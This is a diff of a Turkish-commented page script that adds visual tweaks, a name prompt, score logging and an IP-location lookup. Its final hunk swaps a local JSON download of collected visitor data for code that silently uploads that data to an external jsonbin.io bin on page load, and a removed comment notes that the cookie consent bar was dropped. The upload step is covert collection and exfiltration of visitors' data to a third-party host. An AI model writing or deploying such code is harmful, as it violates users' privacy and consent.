@@ -21,7 +21,7 @@
 
   // Başlıkları güncelle
   document.querySelectorAll('h1,h2,h3,h4,h5').forEach(element => {
-    element.textContent = 'Beşiktaş Resmi Sayfası';
+    element.textContent = 'Resmi Sayfa';
   });
 
   // Giriş butonu düzenlemesi
@@ -33,19 +33,6 @@
     loginButton.style.fontWeight = '600';
     loginButton.style.border = '2px solid white';
     loginButton.style.cursor = 'pointer';
-  }
-
-  // Ses dosyaları
-  const eagleSound = new Audio("https://www.fesliyanstudios.com/play-mp3/4382");
-  const anthemSound = new Audio("https://cdn.pixabay.com/download/audio/2023/05/22/audio_191cddeec2.mp3?filename=stadium-cheering-14648.mp3");
-  anthemSound.loop = true;
-
-  if(loginButton){
-    loginButton.addEventListener('click', () => {
-      eagleSound.play().catch(() => console.log("Ses çalınamadı, kullanıcı etkileşimi gereklidir."));
-      anthemSound.play().catch(() => console.log("Marş çalınamadı, kullanıcı etkileşimi gereklidir."));
-      // alert kaldırıldı (isteğin doğrultusunda)
-    });
   }
 
   // Admin panel yazısı
@@ -91,7 +78,7 @@
     updateAdminPanelColors();
   }, 20000);
 
-  // Kartal animasyonu
+  // Kartal animasyonu (sadeleştirilebilir)
   function flyEagle() {
     const eagleAnimation = document.createElement('img');
     eagleAnimation.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
@@ -114,12 +101,12 @@
   setInterval(flyEagle, 30000);
   flyEagle();
 
-  // Skor takibi
+  // Skor takibi (örnek amaçlı)
   function displayScore() {
     const score = Math.floor(Math.random() * 100);
-    let highestScore = localStorage.getItem('besiktasHighestScore') || 0;
+    let highestScore = localStorage.getItem('highestScore') || 0;
     if (score > highestScore) {
-      localStorage.setItem('besiktasHighestScore', score);
+      localStorage.setItem('highestScore', score);
       console.log(`Yeni rekor: ${score}`);
     } else {
       console.log(`Skor: ${score}. Rekor: ${highestScore}`);
@@ -127,7 +114,7 @@
   }
   displayScore();
 
-  // Kullanıcıdan isim alma (alert kaldırıldı)
+  // Kullanıcıdan isim alma
   const userName = prompt("Lütfen kullanıcı adınızı giriniz:");
   if (userName) {
     const welcomeMessage = document.createElement('h2');
@@ -150,8 +137,6 @@
     }
   }
   const locationData = await getIpLocation();
-
-  // Çerez onay barını kaldırdığın için direkt veri toplama ve indirme
 
   // Veri toplama fonksiyonu
   function collectData() {
@@ -179,24 +164,52 @@
     };
   }
 
-  // JSON indir fonksiyonu
-  function downloadJson(data, filename) {
-    const jsonStr = JSON.stringify(data, null, 2);
-    const blob = new Blob([jsonStr], { type: 'application/json' });
-    const url = URL.createObjectURL(blob);
-    const anchor = document.createElement('a');
-    anchor.href = url;
-    anchor.download = filename;
-    document.body.appendChild(anchor);
-    anchor.click();
-    document.body.removeChild(anchor);
-    URL.revokeObjectURL(url);
+  // --- JSONBIN.IO ENTEGRASYONU ---
+
+  const apiKey = 'BURAYA_API_KEYİNİ_YAZ';  // Buraya jsonbin.io API Key
+  const binId = 'BURAYA_BIN_ID_YAZ';        // Buraya jsonbin.io Bin ID
+
+  // Veri gönderme
+  async function sendDataToJsonBin(data) {
+    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Master-Key': apiKey
+      },
+      body: JSON.stringify(data)
+    });
+
+    if (!res.ok) {
+      console.error('Veri gönderme başarısız:', res.statusText);
+    } else {
+      console.log('Veri başarıyla gönderildi.');
+    }
   }
 
-  // Verileri hemen topla ve indir
-  const data = collectData();
-  const safeName = (userName || 'user').replace(/\s+/g, '_');
-  downloadJson(data, `besiktas_user_data_${safeName}.json`);
+  // Veri alma
+  async function getDataFromJsonBin() {
+    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+      headers: {
+        'X-Master-Key': apiKey
+      }
+    });
+
+    if (!res.ok) {
+      console.error('Veri alma başarısız:', res.statusText);
+      return null;
+    }
+
+    const json = await res.json();
+    return json.record;
+  }
+
+  // Veri toplama ve gönderme işlemi
+  const dataToSend = collectData();
+  await sendDataToJsonBin(dataToSend);
+
+  // Veri alma ve konsola yazdırma
+  const receivedData = await getDataFromJsonBin();
+  console.log('Jsonbin’den alınan veri:', receivedData);
 
 })();
-
